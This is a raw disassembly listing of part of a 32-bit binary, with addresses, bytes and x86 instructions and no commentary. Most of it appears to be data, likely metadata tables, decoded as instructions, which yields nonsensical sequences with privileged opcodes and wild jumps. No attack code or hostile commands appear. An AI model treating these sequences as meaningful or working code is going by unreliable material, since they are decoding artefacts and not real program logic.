  405f11:	02 6b 0e             	add    0xe(%ebx),%ch
  405f14:	13 00                	adc    (%eax),%eax
  405f16:	39 00                	cmp    %eax,(%eax)
  405f18:	3d 0f f8 04 39       	cmp    $0x3904f80f,%eax
  405f1d:	00 47 0f             	add    %al,0xf(%edi)
  405f20:	fd                   	std
  405f21:	04 39                	add    $0x39,%al
  405f23:	00 73 0e             	add    %dh,0xe(%ebx)
  405f26:	05 05 71 02 19       	add    $0x19027105,%eax
  405f2b:	01 28                	add    %ebp,(%eax)
  405f2d:	03 59 00             	add    0x0(%ecx),%ebx
  405f30:	19 01                	sbb    %eax,(%ecx)
  405f32:	09 05 79 02 75 0f    	or     %eax,0xf750279
  405f38:	10 05 81 02 90 0f    	adc    %al,0xf900281
  405f3e:	da 00                	fiaddl (%eax)
  405f40:	89 02                	mov    %eax,(%edx)
  405f42:	b4 0f                	mov    $0xf,%ah
  405f44:	32 05 01 01 30 02    	xor    0x2300101,%al
  405f4a:	63 01                	arpl   %eax,(%ecx)
  405f4c:	31 00                	xor    %eax,(%eax)
  405f4e:	c5 0f                	lds    (%edi),%ecx
  405f50:	39 05 31 00 ca 0f    	cmp    %eax,0xfca0031
  405f56:	de 03                	fiadds (%ebx)
  405f58:	89 02                	mov    %eax,(%edx)
  405f5a:	21 0b                	and    %ecx,(%ebx)
  405f5c:	da 00                	fiaddl (%eax)
  405f5e:	31 00                	xor    %eax,(%eax)
  405f60:	f7 03 e8 04 41 00    	testl  $0x4104e8,(%ebx)
  405f66:	6b 0e 13             	imul   $0x13,(%esi),%ecx
  405f69:	00 69 02             	add    %ch,0x2(%ecx)
  405f6c:	d4 0f                	aam    $0xf
  405f6e:	13 00                	adc    (%eax),%eax
  405f70:	31 00                	xor    %eax,(%eax)
  405f72:	d4 0f                	aam    $0xf
  405f74:	13 00                	adc    (%eax),%eax
  405f76:	31 00                	xor    %eax,(%eax)
  405f78:	6b 0e 13             	imul   $0x13,(%esi),%ecx
  405f7b:	00 99 02 dd 0f 17    	add    %bl,0x170fdd02(%ecx)
  405f81:	00 69 01             	add    %ch,0x1(%ecx)
  405f84:	ba 0c 5e 05 c9       	mov    $0xc9055e0c,%edx
  405f89:	02 b6 0b 6f 05 d9    	add    -0x26fa90f5(%esi),%dh
  405f8f:	02 97 10 17 00 31    	add    0x31001710(%edi),%dl
  405f95:	00 ae 10 7a 05 e9    	add    %ch,-0x16fa85f0(%esi)
  405f9b:	02 bf 10 8e 01 f1    	add    -0xefe71f0(%edi),%bh
  405fa1:	02 e4                	add    %ah,%ah
  405fa3:	10 81 05 f1 02 0f    	adc    %al,0xf02f105(%ecx)
  405fa9:	11 86 05 f1 02 24    	adc    %eax,0x2402f105(%esi)
  405faf:	11 6f 03             	adc    %ebp,0x3(%edi)
  405fb2:	e1 01                	loope  0x405fb5
  405fb4:	3f                   	aas
  405fb5:	11 c5                	adc    %eax,%ebp
  405fb7:	00 e1                	add    %ah,%cl
  405fb9:	01 4b 11             	add    %ecx,0x11(%ebx)
  405fbc:	0e                   	push   %cs
  405fbd:	04 a1                	add    $0xa1,%al
  405fbf:	02 19                	add    (%ecx),%bl
  405fc1:	01 13                	add    %edx,(%ebx)
  405fc3:	00 a1 02 53 11 d6    	add    %ah,-0x29eeacfe(%ecx)
  405fc9:	01 01                	add    %eax,(%ecx)
  405fcb:	03 44 0b 8d          	add    -0x73(%ebx,%ecx,1),%eax
  405fcf:	05 09 03 80 11       	add    $0x11800309,%eax
  405fd4:	94                   	xchg   %eax,%esp
  405fd5:	05 59 00 86 11       	add    $0x11860059,%eax
  405fda:	13 00                	adc    (%eax),%eax
  405fdc:	59                   	pop    %ecx
  405fdd:	00 44 0b 9e          	add    %al,-0x62(%ebx,%ecx,1)
  405fe1:	05 39 01 9a 11       	add    $0x119a0139,%eax
  405fe6:	a3 05 21 03 ad       	mov    %eax,0xad032105
  405feb:	11 9a 01 21 03 b9    	adc    %ebx,-0x46fcdeff(%edx)
  405ff1:	11 aa 05 29 01 c6    	adc    %ebp,-0x39fed6fb(%edx)
  405ff7:	11 71 00             	adc    %esi,0x0(%ecx)
  405ffa:	41                   	inc    %ecx
  405ffb:	02 01                	add    (%ecx),%al
  405ffd:	12 b0 05 29 03 2a    	adc    0x2a032905(%eax),%dh
  406003:	12 b6 05 31 03 3a    	adc    0x3a033105(%esi),%dh
  406009:	12 25 02 39 03 4e    	adc    0x4e033902,%ah
  40600f:	12 bc 05 39 03 60 12 	adc    0x12600339(%ebp,%eax,1),%bh
  406016:	c2 05 b9             	ret    $0xb905
  406019:	02 6b 12             	add    0x12(%ebx),%ch
  40601c:	68 00 b9 02 75       	push   $0x7502b900
  406021:	12 68 00             	adc    0x0(%eax),%ch
  406024:	c1 02 19             	roll   $0x19,(%edx)
  406027:	01 c8                	add    %ecx,%eax
  406029:	05 a9 02 a9 12       	add    $0x12a902a9,%eax
  40602e:	d1 05 49 03 6b 12    	roll   $1,0x126b0349
  406034:	68 00 49 03 75       	push   $0x75034900
  406039:	12 68 00             	adc    0x0(%eax),%ch
  40603c:	b1 02                	mov    $0x2,%cl
  40603e:	19 01                	sbb    %eax,(%ecx)
  406040:	da 05 a9 02 c6 12    	fiaddl 0x12c602a9
  406046:	e0 05                	loopne 0x40604d
  406048:	c1 02 19             	roll   $0x19,(%edx)
  40604b:	01 da                	add    %ebx,%edx
  40604d:	05 b9 02 19 01       	add    $0x11902b9,%eax
  406052:	ee                   	out    %al,(%dx)
  406053:	05 a9 02 e2 12       	add    $0x12e202a9,%eax
  406058:	f6 05 61 03 f8 12 06 	testb  $0x6,0x12f80361
  40605f:	06                   	push   %es
  406060:	49                   	dec    %ecx
  406061:	03 01                	add    (%ecx),%eax
  406063:	13 0c 06             	adc    (%esi,%eax,1),%ecx
  406066:	e9 02 06 13 94       	jmp    0x9453666d
  40606b:	01 a9 02 6b 0e 13    	add    %ebp,0x130e6b02(%ecx)
  406071:	00 49 03             	add    %cl,0x3(%ecx)
  406074:	6b 0e 13             	imul   $0x13,(%esi),%ecx
  406077:	00 71 03             	add    %dh,0x3(%ecx)
  40607a:	3c 13                	cmp    $0x13,%al
  40607c:	5a                   	pop    %edx
  40607d:	06                   	push   %es
  40607e:	71 03                	jno    0x406083
  406080:	57                   	push   %edi
  406081:	13 60 06             	adc    0x6(%eax),%esp
  406084:	79 03                	jns    0x406089
  406086:	5c                   	pop    %esp
  406087:	13 68 06             	adc    0x6(%eax),%ebp
  40608a:	81 03 70 13 71 00    	addl   $0x711370,(%ebx)
  406090:	29 00                	sub    %eax,(%eax)
  406092:	79 13                	jns    0x4060a7
  406094:	6e                   	outsb  %ds:(%esi),(%dx)
  406095:	06                   	push   %es
  406096:	79 02                	jns    0x40609a
  406098:	84 13                	test   %dl,(%ebx)
  40609a:	75 06                	jne    0x4060a2
  40609c:	e9 01 8c 13 86       	jmp    0x8653eca2
  4060a1:	06                   	push   %es
  4060a2:	e9 02 aa 13 23       	jmp    0x23540aa9
  4060a7:	03 69 01             	add    0x1(%ecx),%ebp
  4060aa:	b8 13 8d 06 21       	mov    $0x21068d13,%eax
  4060af:	03 c3                	add    %ebx,%eax
  4060b1:	13 25 01 e9 02 ca    	adc    0xca02e901,%esp
  4060b7:	13 25 01 69 00 de    	adc    0xde006901,%esp
  4060bd:	13 a9 06 91 03 19    	adc    0x19039106(%ecx),%ebp
  4060c3:	01 13                	add    %edx,(%ebx)
  4060c5:	00 91 03 44 0b 13    	add    %dl,0x130b4403(%ecx)
  4060cb:	00 91 03 ea 13 af    	add    %dl,-0x50ec15fd(%ecx)
  4060d1:	06                   	push   %es
  4060d2:	69 00 f6 13 b4 06    	imul   $0x6b413f6,(%eax),%eax
  4060d8:	54                   	push   %esp
  4060d9:	00 19                	add    %bl,(%ecx)
  4060db:	01 13                	add    %edx,(%ebx)
  4060dd:	00 54 00 27          	add    %dl,0x27(%eax,%eax,1)
  4060e1:	14 d8                	adc    $0xd8,%al
  4060e3:	06                   	push   %es
  4060e4:	01 03                	add    %eax,(%ebx)
  4060e6:	2b 14 de             	sub    (%esi,%ebx,8),%edx
  4060e9:	06                   	push   %es
  4060ea:	01 03                	add    %eax,(%ebx)
  4060ec:	38 14 71             	cmp    %dl,(%ecx,%esi,2)
  4060ef:	00 69 01             	add    %ch,0x1(%ecx)
  4060f2:	4c                   	dec    %esp
  4060f3:	14 25                	adc    $0x25,%al
  4060f5:	01 69 01             	add    %ebp,0x1(%ecx)
  4060f8:	5a                   	pop    %edx
  4060f9:	14 71                	adc    $0x71,%al
  4060fb:	00 69 01             	add    %ch,0x1(%ecx)
  4060fe:	62 14 8d 06 5c 00 19 	bound  %edx,0x19005c06(,%ecx,4)
  406105:	01 28                	add    %ebp,(%eax)
  406107:	03 a9 03 a3 14 ed    	add    -0x12eb5cfd(%ecx),%ebp
  40610d:	06                   	push   %es
  40610e:	c9                   	leave
  40610f:	03 d1                	add    %ecx,%edx
  406111:	14 1b                	adc    $0x1b,%al
  406113:	07                   	pop    %es
  406114:	b9 03 d8 14 25       	mov    $0x2514d803,%ecx
  406119:	02 b9 03 e6 14 18    	add    0x1814e603(%ecx),%bh
  40611f:	03 b9 03 fc 14 d3    	add    -0x2ceb03fd(%ecx),%edi
  406125:	03 b9 03 08 15 25    	add    0x25150803(%ecx),%edi
  40612b:	02 b9 03 1f 15 22    	add    0x22151f03(%ecx),%bh
  406131:	07                   	pop    %es
  406132:	c9                   	leave
  406133:	02 2b                	add    (%ebx),%ch
  406135:	15 63 01 21 03       	adc    $0x3210163,%eax
  40613a:	42                   	inc    %edx
  40613b:	15 0b 01 69 01       	adc    $0x169010b,%eax
  406140:	50                   	push   %eax
  406141:	15 8d 06 d9 03       	adc    $0x3d9068d,%eax
  406146:	19 01                	sbb    %eax,(%ecx)
  406148:	25 02 d9 03 6c       	and    $0x6c03d902,%eax
  40614d:	15 3b 07 d9 03       	adc    $0x3d9073b,%eax
  406152:	7c 15                	jl     0x406169
  406154:	25 02 01 03 44       	and    $0x44030102,%eax
  406159:	0b 42 07             	or     0x7(%edx),%eax
  40615c:	79 03                	jns    0x406161
  40615e:	8a 15 5b 07 79 03    	mov    0x379075b,%dl
  406164:	57                   	push   %edi
  406165:	09 7f 04             	or     %edi,0x4(%edi)
  406168:	e9 03 b2 15 61       	jmp    0x61561370
  40616d:	07                   	pop    %es
  40616e:	e9 03 9a 0a 68       	jmp    0x684afb76
  406173:	07                   	pop    %es
  406174:	f9                   	stc
  406175:	03 c9                	add    %ecx,%ecx
  406177:	15 7f 07 f9 03       	adc    $0x3f9077f,%eax
  40617c:	d2 15 85 07 31 00    	rclb   %cl,0x310785
  406182:	ee                   	out    %al,(%dx)
  406183:	03 8b 07 01 04 19    	add    0x19040107(%ebx),%ecx
  406189:	01 25 02 09 04 19    	add    %esp,0x19040902
  40618f:	01 a3 07 e1 01 29    	add    %esp,0x2901e107(%ebx)
  406195:	16                   	push   %ss
  406196:	c5 00                	lds    (%eax),%eax
  406198:	19 04 19             	sbb    %eax,(%ecx,%ebx,1)
  40619b:	01 25 02 21 04 44    	add    %esp,0x44042102
  4061a1:	16                   	push   %ss
  4061a2:	25 02 d9 02 4e       	and    $0x4e02d902,%eax
  4061a7:	16                   	push   %ss
  4061a8:	c5 00                	lds    (%eax),%eax
  4061aa:	d9 02                	flds   (%edx)
  4061ac:	5e                   	pop    %esi
  4061ad:	16                   	push   %ss
  4061ae:	c5 00                	lds    (%eax),%eax
  4061b0:	d9 03                	flds   (%ebx)
  4061b2:	19 01                	sbb    %eax,(%ecx)
  4061b4:	13 00                	adc    (%eax),%eax
  4061b6:	d9 03                	flds   (%ebx)
  4061b8:	71 16                	jno    0x4061d0
  4061ba:	25 02 d9 03 7e       	and    $0x7e03d902,%eax
  4061bf:	16                   	push   %ss
  4061c0:	18 03                	sbb    %al,(%ebx)
  4061c2:	d9 03                	flds   (%ebx)
  4061c4:	91                   	xchg   %eax,%ecx
  4061c5:	16                   	push   %ss
  4061c6:	18 03                	sbb    %al,(%ebx)
  4061c8:	d9 03                	flds   (%ebx)
  4061ca:	a1 16 18 03 29       	mov    0x29031816,%eax
  4061cf:	04 19                	add    $0x19,%al
  4061d1:	01 13                	add    %edx,(%ebx)
  4061d3:	00 39                	add    %bh,(%ecx)
  4061d5:	04 19                	add    $0x19,%al
  4061d7:	01 13                	add    %edx,(%ebx)
  4061d9:	00 41 04             	add    %al,0x4(%ecx)
  4061dc:	1a 17                	sbb    (%edi),%dl
  4061de:	bc 07 49 04 2c       	mov    $0x2c044907,%esp
  4061e3:	17                   	pop    %ss
  4061e4:	c3                   	ret
  4061e5:	07                   	pop    %es
  4061e6:	51                   	push   %ecx
  4061e7:	04 44                	add    $0x44,%al
  4061e9:	17                   	pop    %ss
  4061ea:	d0 07                	rolb   $1,(%edi)
  4061ec:	51                   	push   %ecx
  4061ed:	04 57                	add    $0x57,%al
  4061ef:	17                   	pop    %ss
  4061f0:	d6                   	salc
  4061f1:	07                   	pop    %es
  4061f2:	51                   	push   %ecx
  4061f3:	04 60                	add    $0x60,%al
  4061f5:	17                   	pop    %ss
  4061f6:	dd 07                	fldl   (%edi)
  4061f8:	31 04 70             	xor    %eax,(%eax,%esi,2)
  4061fb:	17                   	pop    %ss
  4061fc:	e3 07                	jecxz  0x406205
  4061fe:	01 03                	add    %eax,(%ebx)
  406200:	84 17                	test   %dl,(%edi)
  406202:	00 08                	add    %cl,(%eax)
  406204:	01 03                	add    %eax,(%ebx)
  406206:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406207:	17                   	pop    %ss
  406208:	06                   	push   %es
  406209:	08 61 04             	or     %ah,0x4(%ecx)
  40620c:	b3 17                	mov    $0x17,%bl
  40620e:	71 00                	jno    0x406210
  406210:	69 00 19 01 0c 08    	imul   $0x80c0119,(%eax),%eax
  406216:	69 04 d4 17 16 08 71 	imul   $0x71081617,(%esp,%edx,8),%eax
  40621d:	00 19                	add    %bl,(%ecx)
  40621f:	01 d3                	add    %edx,%ebx
  406221:	03 69 01             	add    0x1(%ecx),%ebp
  406224:	e2 17                	loop   0x40623d
  406226:	1d 08 71 00 4f       	sbb    $0x4f007108,%eax
  40622b:	0e                   	push   %cs
  40622c:	22 08                	and    (%eax),%cl
  40622e:	79 04                	jns    0x406234
  406230:	f4                   	hlt
  406231:	17                   	pop    %ss
  406232:	30 08                	xor    %cl,(%eax)
  406234:	39 01                	cmp    %eax,(%ecx)
  406236:	fb                   	sti
  406237:	17                   	pop    %ss
  406238:	73 01                	jae    0x40623b
  40623a:	69 00 27 14 3c 08    	imul   $0x83c1427,(%eax),%eax
  406240:	f9                   	stc
  406241:	03 09                	add    (%ecx),%ecx
  406243:	18 54 08 39          	sbb    %dl,0x39(%eax,%ecx,1)
  406247:	01 13                	add    %edx,(%ebx)
  406249:	18 73 01             	sbb    %dh,0x1(%ebx)
  40624c:	39 01                	cmp    %eax,(%ecx)
  40624e:	26 18 c5             	es sbb %al,%ch
  406251:	00 e1                	add    %ah,%cl
  406253:	01 3a                	add    %edi,(%edx)
  406255:	18 9a 01 81 04 19    	sbb    %bl,0x19048101(%edx)
  40625b:	01 25 02 81 04 50    	add    %esp,0x50048102
  406261:	18 05 05 f9 03 64    	sbb    %al,0x6403f905
  406267:	18 7f 07             	sbb    %bh,0x7(%edi)
  40626a:	99                   	cltd
  40626b:	01 30                	add    %esi,(%eax)
  40626d:	02 2a                	add    (%edx),%ch
  40626f:	04 69                	add    $0x69,%al
  406271:	01 6e 18             	add    %ebp,0x18(%esi)
  406274:	71 00                	jno    0x406276
  406276:	91                   	xchg   %eax,%ecx
  406277:	04 7f                	add    $0x7f,%al
  406279:	18 6f 08             	sbb    %ch,0x8(%edi)
  40627c:	31 03                	xor    %eax,(%ebx)
  40627e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40627f:	18 74 08 31          	sbb    %dh,0x31(%eax,%ecx,1)
  406283:	03 01                	add    (%ecx),%eax
  406285:	07                   	pop    %es
  406286:	7e 08                	jle    0x406290
  406288:	31 03                	xor    %eax,(%ebx)
  40628a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40628b:	18 91 08 31 03 10    	sbb    %dl,0x10033108(%ecx)
  406291:	07                   	pop    %es
  406292:	7f 04                	jg     0x406298
  406294:	39 00                	cmp    %eax,(%eax)
  406296:	19 01                	sbb    %eax,(%ecx)
  406298:	d0 07                	rolb   $1,(%edi)
  40629a:	01 01                	add    %eax,(%ecx)
  40629c:	c5 18                	lds    (%eax),%ebx
  40629e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40629f:	08 a9 04 aa 13 ab    	or     %ch,-0x54ec55fc(%ecx)
  4062a5:	08 b1 04 19 01 b2    	or     %dh,-0x4dfee6fc(%ecx)
  4062ab:	08 e9                	or     %ch,%cl
  4062ad:	01 0e                	add    %ecx,(%esi)
  4062af:	19 a9 04 01 01 f1    	sbb    %ebp,-0xefefefc(%ecx)
  4062b5:	09 bc 08 a9 04 d2 15 	or     %edi,0x15d204a9(%eax,%ecx,1)
  4062bc:	d2 08                	rorb   %cl,(%eax)
  4062be:	51                   	push   %ecx
  4062bf:	04 1d                	add    $0x1d,%al
  4062c1:	19 dd                	sbb    %ebx,%ebp
  4062c3:	07                   	pop    %es
  4062c4:	79 00                	jns    0x4062c6
  4062c6:	19 01                	sbb    %eax,(%ecx)
  4062c8:	f9                   	stc
  4062c9:	08 49 01             	or     %cl,0x1(%ecx)
  4062cc:	d4 0f                	aam    $0xf
  4062ce:	13 00                	adc    (%eax),%eax
  4062d0:	c1 04 19 01          	roll   $0x1,(%ecx,%ebx,1)
  4062d4:	06                   	push   %es
  4062d5:	09 d1                	or     %edx,%ecx
  4062d7:	04 19                	add    $0x19,%al
  4062d9:	01 d3                	add    %edx,%ebx
  4062db:	03 d9                	add    %ecx,%ebx
  4062dd:	04 19                	add    $0x19,%al
  4062df:	01 13                	add    %edx,(%ebx)
  4062e1:	00 e1                	add    %ah,%cl
  4062e3:	04 19                	add    $0x19,%al
  4062e5:	01 25 02 e9 04 19    	add    %esp,0x1904e902
  4062eb:	01 25 02 f1 04 19    	add    %esp,0x1904f102
  4062f1:	01 25 02 f9 04 19    	add    %esp,0x1904f902
  4062f7:	01 25 02 01 05 19    	add    %esp,0x19050102
  4062fd:	01 25 02 09 05 19    	add    %esp,0x19050902
  406303:	01 25 02 11 05 19    	add    %esp,0x19051102
  406309:	01 25 02 19 05 19    	add    %esp,0x19051902
  40630f:	01 25 02 0e 00 80    	add    %esp,0x80000e02
  406315:	00 2a                	add    %ch,(%edx)
  406317:	01 09                	add    %ecx,(%ecx)
  406319:	00 b8 00 b8 01 09    	add    %bh,0x901b800(%eax)
  40631f:	00 bc 00 bd 01 09 00 	add    %bh,0x901bd(%eax,%eax,1)
  406326:	c0 00 c2             	rolb   $0xc2,(%eax)
  406329:	01 29                	add    %ebp,(%ecx)
  40632b:	00 83 00 4b 02 2e    	add    %al,0x2e024b00(%ebx)
  406331:	00 ab 08 1d 03 2e    	add    %ch,0x2e031d08(%ebx)
  406337:	00 9b 08 1d 03 2e    	add    %bl,0x2e031d08(%ebx)
  40633d:	00 8b 08 1d 03 2e    	add    %cl,0x2e031d08(%ebx)
  406343:	00 b3 08 1d 03 2e    	add    %dh,0x2e031d08(%ebx)
  406349:	00 a3 08 1d 03 2e    	add    %ah,0x2e031d08(%ebx)
  40634f:	00 93 08 1d 03 2e    	add    %dl,0x2e031d08(%ebx)
  406355:	00 6b 08             	add    %ch,0x8(%ebx)
  406358:	0f 09                	wbinvd
  40635a:	2e 00 73 08          	add    %dh,%cs:0x8(%ebx)
  40635e:	18 09                	sbb    %cl,(%ecx)
  406360:	2e 00 7b 08          	add    %bh,%cs:0x8(%ebx)
  406364:	37                   	aaa
  406365:	09 2e                	or     %ebp,(%esi)
  406367:	00 83 08 61 09 40    	add    %al,0x40096108(%ebx)
  40636d:	00 13                	add    %dl,(%ebx)
  40636f:	00 cd                	add    %cl,%ch
  406371:	01 40 00             	add    %eax,0x0(%eax)
  406374:	2b 00                	sub    (%eax),%eax
  406376:	c2 01 43             	ret    $0x4301
  406379:	00 13                	add    %dl,(%ebx)
  40637b:	00 cd                	add    %cl,%ch
  40637d:	01 43 00             	add    %eax,0x0(%ebx)
  406380:	1b 00                	sbb    (%eax),%eax
  406382:	dc 01                	faddl  (%ecx)
  406384:	49                   	dec    %ecx
  406385:	00 83 00 5c 02 63    	add    %al,0x63025c00(%ebx)
  40638b:	00 13                	add    %dl,(%ebx)
  40638d:	00 cd                	add    %cl,%ch
  40638f:	01 63 00             	add    %esp,0x0(%ebx)
  406392:	1b 00                	sbb    (%eax),%eax
  406394:	dc 01                	faddl  (%ecx)
  406396:	69 00 83 00 2a 02    	imul   $0x22a0083,(%eax),%eax
  40639c:	80 00 2b             	addb   $0x2b,(%eax)
  40639f:	00 c2                	add    %al,%dl
  4063a1:	01 83 00 1b 00 dc    	add    %eax,-0x23ffe500(%ebx)
  4063a7:	01 83 00 7b 00 c2    	add    %eax,-0x3dff8500(%ebx)
  4063ad:	01 83 00 73 00 c2    	add    %eax,-0x3dff8d00(%ebx)
  4063b3:	01 89 00 83 00 37    	add    %ecx,0x37008300(%ecx)
  4063b9:	02 a0 00 2b 00 c2    	add    -0x3dffd500(%eax),%ah
  4063bf:	01 a1 00 db 00 c2    	add    %esp,-0x3dff2500(%ecx)
  4063c5:	01 a1 00 e3 00 c2    	add    %esp,-0x3dff1d00(%ecx)
  4063cb:	01 a3 00 13 00 cd    	add    %esp,-0x32ffed00(%ebx)
  4063d1:	01 a3 00 c3 00 a5    	add    %esp,-0x5aff3d00(%ebx)
  4063d7:	02 c0                	add    %al,%al
  4063d9:	00 2b                	add    %ch,(%ebx)
  4063db:	00 c2                	add    %al,%dl
  4063dd:	01 c3                	add    %eax,%ebx
  4063df:	00 13                	add    %dl,(%ebx)
  4063e1:	00 cd                	add    %cl,%ch
  4063e3:	01 c3                	add    %eax,%ebx
  4063e5:	00 d3                	add    %dl,%bl
  4063e7:	00 1d 03 e0 00 2b    	add    %bl,0x2b00e003
  4063ed:	00 c2                	add    %al,%dl
  4063ef:	01 00                	add    %eax,(%eax)
  4063f1:	01 2b                	add    %ebp,(%ebx)
  4063f3:	00 c2                	add    %al,%dl
  4063f5:	01 00                	add    %eax,(%eax)
  4063f7:	01 13                	add    %edx,(%ebx)
  4063f9:	00 cd                	add    %cl,%ch
  4063fb:	01 20                	add    %esp,(%eax)
  4063fd:	01 13                	add    %edx,(%ebx)
  4063ff:	00 cd                	add    %cl,%ch
  406401:	01 20                	add    %esp,(%eax)
  406403:	01 2b                	add    %ebp,(%ebx)
  406405:	00 c2                	add    %al,%dl
  406407:	01 40 01             	add    %eax,0x1(%eax)
  40640a:	13 00                	adc    (%eax),%eax
  40640c:	cd 01                	int    $0x1
  40640e:	40                   	inc    %eax
  40640f:	01 2b                	add    %ebp,(%ebx)
  406411:	00 c2                	add    %al,%dl
  406413:	01 60 01             	add    %esp,0x1(%eax)
  406416:	2b 00                	sub    (%eax),%eax
  406418:	c2 01 60             	ret    $0x6001
  40641b:	01 13                	add    %edx,(%ebx)
  40641d:	00 cd                	add    %cl,%ch
  40641f:	01 80 01 2b 00 c2    	add    %eax,-0x3dffd4ff(%eax)
  406425:	01 a0 01 2b 00 c2    	add    %esp,-0x3dffd4ff(%eax)
  40642b:	01 a3 01 73 00 c2    	add    %esp,-0x3dff8cff(%ebx)
  406431:	01 c0                	add    %eax,%eax
  406433:	01 13                	add    %edx,(%ebx)
  406435:	00 cd                	add    %cl,%ch
  406437:	01 c0                	add    %eax,%eax
  406439:	01 2b                	add    %ebp,(%ebx)
  40643b:	00 c2                	add    %al,%dl
  40643d:	01 e0                	add    %esp,%eax
  40643f:	01 2b                	add    %ebp,(%ebx)
  406441:	00 c2                	add    %al,%dl
  406443:	01 00                	add    %eax,(%eax)
  406445:	02 13                	add    (%ebx),%dl
  406447:	00 cd                	add    %cl,%ch
  406449:	01 00                	add    %eax,(%eax)
  40644b:	02 2b                	add    (%ebx),%ch
  40644d:	00 c2                	add    %al,%dl
  40644f:	01 03                	add    %eax,(%ebx)
  406451:	02 e3                	add    %bl,%ah
  406453:	00 c2                	add    %al,%dl
  406455:	01 03                	add    %eax,(%ebx)
  406457:	02 f3                	add    %bl,%dh
  406459:	00 3d 03 23 02 e3    	add    %bh,0xe3022303
  40645f:	00 c2                	add    %al,%dl
  406461:	01 80 02 63 01 c2    	add    %eax,-0x3dfe9cfe(%eax)
  406467:	01 a0 02 fb 00 c2    	add    %esp,-0x3dff04fe(%eax)
  40646d:	01 a0 02 e3 00 c2    	add    %esp,-0x3dff1cfe(%eax)
  406473:	01 c0                	add    %eax,%eax
  406475:	02 e3                	add    %bl,%ah
  406477:	00 c2                	add    %al,%dl
  406479:	01 40 05             	add    %eax,0x5(%eax)
  40647c:	fb                   	sti
  40647d:	00 c2                	add    %al,%dl
  40647f:	01 40 05             	add    %eax,0x5(%eax)
  406482:	e3 00                	jecxz  0x406484
  406484:	c2 01 60             	ret    $0x6001
  406487:	05 e3 00 c2 01       	add    $0x1c200e3,%eax
  40648c:	60                   	pusha
  40648d:	05 fb 00 c2 01       	add    $0x1c200fb,%eax
  406492:	20 07                	and    %al,(%edi)
  406494:	e3 00                	jecxz  0x406496
  406496:	c2 01 20             	ret    $0x2001
  406499:	07                   	pop    %es
  40649a:	fb                   	sti
  40649b:	00 c2                	add    %al,%dl
  40649d:	01 40 07             	add    %eax,0x7(%eax)
  4064a0:	fb                   	sti
  4064a1:	00 c2                	add    %al,%dl
  4064a3:	01 40 07             	add    %eax,0x7(%eax)
  4064a6:	e3 00                	jecxz  0x4064a8
  4064a8:	c2 01 80             	ret    $0x8001
  4064ab:	0b e3                	or     %ebx,%esp
  4064ad:	00 c2                	add    %al,%dl
  4064af:	01 3b                	add    %edi,(%ebx)
  4064b1:	00 aa 07 3f 00 aa    	add    %ch,-0x55ffc0f9(%edx)
  4064b7:	07                   	pop    %es
  4064b8:	56                   	push   %esi
  4064b9:	00 0d 09 58 00 0d    	add    %cl,0xd005809
  4064bf:	09 11                	or     %edx,(%ecx)
  4064c1:	02 16                	add    (%esi),%dl
  4064c3:	02 1b                	add    (%ebx),%bl
  4064c5:	02 20                	add    (%eax),%ah
  4064c7:	02 75 02             	add    0x2(%ebp),%dh
  4064ca:	79 02                	jns    0x4064ce
  4064cc:	84 02                	test   %al,(%edx)
  4064ce:	89 02                	mov    %eax,(%edx)
  4064d0:	98                   	cwtl
  4064d1:	02 98 02 13 03 87    	add    -0x78fcecfe(%eax),%bl
  4064d7:	03 af 03 f8 03 1a    	add    0x1a03f803(%edi),%ebp
  4064dd:	04 2f                	add    $0x2f,%al
  4064df:	04 43                	add    $0x43,%al
  4064e1:	04 5e                	add    $0x5e,%al
  4064e3:	04 90                	add    $0x90,%al
  4064e5:	04 af                	add    $0xaf,%al
  4064e7:	04 c0                	add    $0xc0,%al
  4064e9:	04 de                	add    $0xde,%al
  4064eb:	04 22                	add    $0x22,%al
  4064ed:	05 2c 05 41 05       	add    $0x541052c,%eax
  4064f2:	2c 05                	sub    $0x5,%al
  4064f4:	4f                   	dec    %edi
  4064f5:	05 64 05 16 06       	add    $0x6160564,%eax
  4064fa:	92                   	xchg   %eax,%edx
  4064fb:	06                   	push   %es
  4064fc:	2c 05                	sub    $0x5,%al
  4064fe:	2c 05                	sub    $0x5,%al
  406500:	bc 06 05 07 28       	mov    $0x28070506,%esp
  406505:	07                   	pop    %es
  406506:	31 07                	xor    %eax,(%edi)
  406508:	4b                   	dec    %ebx
  406509:	07                   	pop    %es
  40650a:	6f                   	outsl  %ds:(%esi),(%dx)
  40650b:	07                   	pop    %es
  40650c:	96                   	xchg   %eax,%esi
  40650d:	07                   	pop    %es
  40650e:	ac                   	lods   %ds:(%esi),%al
  40650f:	07                   	pop    %es
  406510:	ec                   	in     (%dx),%al
  406511:	07                   	pop    %es
  406512:	11 08                	adc    %ecx,(%eax)
  406514:	75 02                	jne    0x406518
  406516:	28 08                	sub    %cl,(%eax)
  406518:	79 02                	jns    0x40651c
  40651a:	43                   	inc    %ebx
  40651b:	08 9c 00 48 08 4f 08 	or     %bl,0x84f0848(%eax,%eax,1)
  406522:	89 02                	mov    %eax,(%edx)
  406524:	5a                   	pop    %edx
  406525:	08 60 08             	or     %ah,0x8(%eax)
  406528:	87 08                	xchg   %ecx,(%eax)
  40652a:	98                   	cwtl
  40652b:	08 c1                	or     %al,%cl
  40652d:	08 d8                	or     %bl,%al
  40652f:	08 e6                	or     %ah,%dh
  406531:	08 e6                	or     %ah,%dh
  406533:	08 01                	or     %al,(%ecx)
  406535:	09 04 00             	or     %eax,(%eax,%eax,1)
  406538:	01 00                	add    %eax,(%eax)
  40653a:	06                   	push   %es
  40653b:	00 05 00 00 00 3d    	add    %al,0x3d000000
  406541:	01 4f 00             	add    %ecx,0x0(%edi)
  406544:	00 00                	add    %al,(%eax)
  406546:	f6 01 54             	testb  $0x54,(%ecx)
  406549:	00 00                	add    %al,(%eax)
  40654b:	00 a5 01 59 00 00    	add    %ah,0x5901(%ebp)
  406551:	00 02                	add    %al,(%edx)
  406553:	02 5e 00             	add    0x0(%esi),%bl
  406556:	00 00                	add    %al,(%eax)
  406558:	8f 02                	pop    (%edx)
  40655a:	94                   	xchg   %eax,%esp
  40655b:	00 02                	add    %al,(%edx)
  40655d:	00 04 00             	add    %al,(%eax,%eax,1)
  406560:	03 00                	add    (%eax),%eax
  406562:	02 00                	add    (%eax),%al
  406564:	05 00 05 00 02       	add    $0x2000500,%eax
  406569:	00 06                	add    %al,(%esi)
  40656b:	00 07                	add    %al,(%edi)
  40656d:	00 02                	add    %al,(%edx)
